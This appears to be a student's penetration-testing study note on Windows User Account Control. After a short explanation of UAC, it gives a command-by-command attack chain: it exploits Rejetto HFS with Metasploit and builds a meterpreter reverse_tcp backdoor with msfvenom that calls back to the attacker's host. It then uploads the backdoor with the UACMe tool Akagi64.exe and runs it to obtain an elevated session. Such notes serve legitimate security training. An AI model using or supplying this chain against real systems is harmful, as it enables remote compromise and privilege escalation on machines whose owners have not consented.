# User Account Control
* A security feature introduced in Windows Vista used to prevent unauthorized chnages from being made to the operating system.
* UAC ensures that changes to the OS require approval from the administratoror a user that is part of the local administrator'group.
* If non-privileged user ---> Prompted with UAC credential prompt.
* If privileged user ---> prompted with a consent prompt ususally saying: "Do you want to allow this app to make changes to your device".
* Attacks can bypass UAC to execute malicious executables with elevated priviliges.


# Tools 
 
* **rejetto**
   * `use exploit/windows/http/rejetto_hfs_exec`
   * `set rhosts [IP]` --> `exploit`
   * Inside the meterpreter session, check if the current session is 32-bit or 64-bit with this command: `sysinfo`
   * 32-bit --> x86/windows
   * 64-bit --> x64/windows
   * If we need to change the session from x86 to x64 :---> check the id of explorer.exe ---> `pgrep explorer` ---> `migrate [ID fetched from pgrep]`
   * To know the username ---> `getuid`   ---> ([usernmae]/admin ---> here admin is not administrator. It has limited privileges)
   * To know your privileges --> `getprivs`
   * To open a shell --> `shell`
   
* **UACMe**
    * An open source privilege escalation tool developed by @hfire0x
    * `https:github.com/hfire0x/UACME`
    * The UACMe github repository has more than 60 exploits that can be used to bypass UAC depending on the version of Windows running on the target.
    * repo --> 'Source' --> 'Akagi' --> 'bin' (We'll use Akagai.exe to bypass UAC)
    * **Process** --> Generate a meterpreter payload with msfvenom --> Transfer it to the target system and execute with Akagi.exe to bypass UAC)
       * Step 1: Generate the payload:
             * `msfvenom  -p windows/meterpreter/reverse_tcp LHOST=[My_IP] LPORT=[can give 1234 here] -f [file format of the payload, in this case, exe] > [name of the file, i.e., backdoor.exe]`
       * Step 2: Generate a handler:
             * `use multi/handler`
             * `set payload`~--> `set LHOST` ---> `set LPORT` --> `exploit`
      * Step 3: Upload the malicious backdoor.exe to meterpreter session in rejetto module
            * `cd C:\\` ---> `mkdir Temp` --> `cd Temp`
            * `upload backdoor.exe` ---> `upload Akagi64.exe`
            * Execute the payload ---> `shell` --->  `.\Akagi64.exe 23 C:\Temp\backdoor.exe` --> where 23 is the key noted from the github repo of UACME mentioned above followed by absolute path of the payload uploaded.
      * Now if I go back to the terminal where handler was running, I should see a meterpreter session running with elevated privileges because of the payload executed on the target system.
      * I can check the privilegese by : `get privs`
      * Or can check the processes with: `ps` and then migrate to the process number --> `migrate [process number]`
